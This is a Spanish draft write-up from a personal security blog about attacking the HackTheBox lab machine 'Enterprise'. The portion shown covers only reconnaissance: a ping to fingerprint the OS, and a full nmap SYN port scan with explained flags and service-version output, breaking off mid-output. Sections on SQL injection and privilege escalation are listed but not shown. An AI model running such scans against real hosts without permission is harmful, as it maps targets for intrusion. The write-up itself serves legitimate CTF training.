<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href=/main.a7f80cbecb4d75b311dff18132050d2734c0c75a7b0c64b37f063935363e09943a5ddfdc83fae53ce428caf55938efb15a3a93012575ec1ca51a7f345a88ba84.css integrity="sha512-p/gMvstNdbMR3/GBMgUNJzTAx1p7DGSzfwY5NTY+CZQ6Xd/cg/rlPOQoyvVZOO+xWjqTASV17BylGn80Woi6hA==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/writeups/hackthebox/enterprise/><title>Enterprise | d3b0o</title><meta name=description content><meta property="og:title" content="Enterprise"><meta property="og:description" content="DRAFT (POST EN CONSTRUCIÓN) Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene"><meta property="og:type" content="article"><meta property="og:url" content="/writeups/hackthebox/enterprise/"><meta property="og:image" content="/writeups/hackthebox/enterprise/cover.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-11-11T00:00:00+00:00"><meta property="article:modified_time" content="2023-11-11T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/writeups/hackthebox/enterprise/cover.png"><meta name=twitter:title content="Enterprise"><meta name=twitter:description content="DRAFT (POST EN CONSTRUCIÓN) Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene"><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3b0o","position":1},{"@type":"ListItem","item":"/writeups/","name":"Writeups","position":2},{"@type":"ListItem","item":"/writeups/hackthebox/","name":"Hack the Box","position":3},{"@type":"ListItem","name":"Enterprise","position":4}]}</script></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=announcement data-id=global-alert-ed321576fabf52d76f925272710cb364 class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>¡Nuevo writeup de la máquina "<a href=/writeups/hackthebox/enterprise>Enterprise</a>" de HackTheBox!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3b0o</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/intro/bienvenido/>Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded active" href=/writeups/hackthebox/enterprise/>Enterprise</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/>Jupiter</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/>Toolbox</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/>Pandora (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/>Horizontall (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/>Bashed (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/blue/>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/tryhackme/blue/>Blue</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/>Chill Hack</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/team/>Team</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/startup/>Startup</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/source/>Source</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/>Mustacchio</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/>Wonderland</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/>Bounty Hacker</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/overpass/>Overpass</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/develpy/>Develpy</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/>Tomghost</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wgel/>Wgel</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/gallery/>Gallery</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/>Mr.Robot</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/>Agent T</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/>Vulnversity</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/>Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/>Agent sudo</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/>Lazy admin</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/>Chocolate Factory</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/rootme/>RootMe</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/>Pickle Rick</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3b0o</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class="nav-link active" href=/writeups/intro/bienvenido/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class="content d-none">Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/intro/bienvenido/>Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded active" href=/writeups/hackthebox/enterprise/>Enterprise</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/>Jupiter</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/>Toolbox</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/>Pandora (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/>Horizontall (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/>Bashed (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/blue/>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/tryhackme/blue/>Blue</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/>Chill Hack</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/team/>Team</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/startup/>Startup</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/source/>Source</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/>Mustacchio</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/>Wonderland</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/>Bounty Hacker</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/overpass/>Overpass</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/develpy/>Develpy</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/>Tomghost</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wgel/>Wgel</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/gallery/>Gallery</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/>Mr.Robot</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/>Agent T</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/>Vulnversity</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/>Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/>Agent sudo</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/>Lazy admin</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/>Chocolate Factory</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/rootme/>RootMe</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/>Pickle Rick</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><a href=#draft-post-en-construción>DRAFT (POST EN CONSTRUCIÓN)</a><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#puerto-443>Puerto 443</a></li><li><a href=#enterprisehtb>enterprise.htb</a></li></ul></li><li><a href=#explotación-sqli>Explotación SQLI</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><a href=#saliendo-del-docker>Saliendo del docker</a></li><li><a href=#root>root</a></li></ul></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/writeups/>Writeups</a></li><li class=breadcrumb-item><a href=/writeups/hackthebox/>HackTheBox</a></li><li class="breadcrumb-item active" aria-current=page>Enterprise</li></ol></nav><div style=display:flex;align-items:center><div style="border-left:8px solid #f49b0a;height:40px;margin-right:10px"></div><h1 style=margin:0;vertical-align:middle>Enterprise</h1></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><a href=#draft-post-en-construción>DRAFT (POST EN CONSTRUCIÓN)</a><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#puerto-443>Puerto 443</a></li><li><a href=#enterprisehtb>enterprise.htb</a></li></ul></li><li><a href=#explotación-sqli>Explotación SQLI</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><a href=#saliendo-del-docker>Saliendo del docker</a></li><li><a href=#root>root</a></li></ul></li></ul></li></ul></nav></div></details></nav><div class=tag-list-single><a class="btn btn-light" href=/tags/ctf/ role=button>CTF</a>
<a class="btn btn-light" href=/tags/rce/ role=button>RCE</a>
<a class="btn btn-light" href=/tags/sqli/ role=button>SQLI</a>
<a class="btn btn-light" href=/tags/cron/ role=button>Cron</a>
<a class="btn btn-light" href=/tags/port-forwarding/ role=button>Port forwarding</a>
<a class="btn btn-light" href=/tags/python/ role=button>Python</a></div><div style=display:flex;align-items:center;vertical-align:middle><img src=/blog/phishing/images/pingu2.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle>
<img src=/blog/phishing/images/htb.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle></div><br><h1 id=draft-post-en-construción>DRAFT (POST EN CONSTRUCIÓN)</h1><h2 id=reconocimiento>Reconocimiento<a href=#reconocimiento class=anchor aria-hidden=true>#</a></h2><p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ping -c <span class=m>1</span> 10.10.10.61
</span></span><span class=line><span class=cl>PING 10.10.10.61 <span class=o>(</span>10.10.10.61<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.10.61: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>94.2 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.10.10.61 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> received, 0% packet loss, <span class=nb>time</span> 0ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 94.201/94.201/94.201/0.000 ms
</span></span></code></pre></div><p>Tenemos conexión y en este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong></p><h3 id=escaneo-de-puertos>Escaneo de puertos<a href=#escaneo-de-puertos class=anchor aria-hidden=true>#</a></h3><p>Ahora empezamos con un escaneo de puertos</p><pre tabindex=0><code>$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.61 -oG allPorts
</code></pre><details><summary>Explicación parámetros</summary><table><thead><tr><th>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td>-p-</td><td>Para que el escaneo sea a todos los puertos (65536)</td></tr><tr><td>&ndash;open</td><td>Para que solo reporte los puertos abiertos</td></tr><tr><td>&ndash;min-rate 5000</td><td>Definir el tiempo del escaneo</td></tr><tr><td>-n</td><td>Omitir resolución DNS</td></tr><tr><td>-vvv</td><td>Para que vaya reportando lo que encuentre por consola</td></tr><tr><td>-Pn</td><td>Para saltar la comprobación de sí la máquina está activa o no</td></tr><tr><td>-oG allPorts</td><td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td></tr></tbody></table></details><br><p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p><p><a href=https://pastebin.com/tYpwpauW>Función extractPorts</a> de <a href=https://s4vitar.github.io>@s4vitar</a></p><pre tabindex=0><code>───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.61
   5   │     [*] Open ports: 22,80,443,8080,32812
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nmap -sCV -p22,80,443,8080,32812 10.10.10.61 -oN versions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp    open  ssh      OpenSSH 7.4p1 Ubuntu <span class=m>10</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp    open  http     Apache httpd 2.4.10 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-generator: WordPress 4.8.1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: USS Enterprise <span class=p>&amp;</span><span class=c1>#8211; Ships Log</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.10 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl>443/tcp   open  ssl/http Apache httpd 2.4.25 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.25 <span class=o>(</span>Ubuntu<span class=o>)</span>
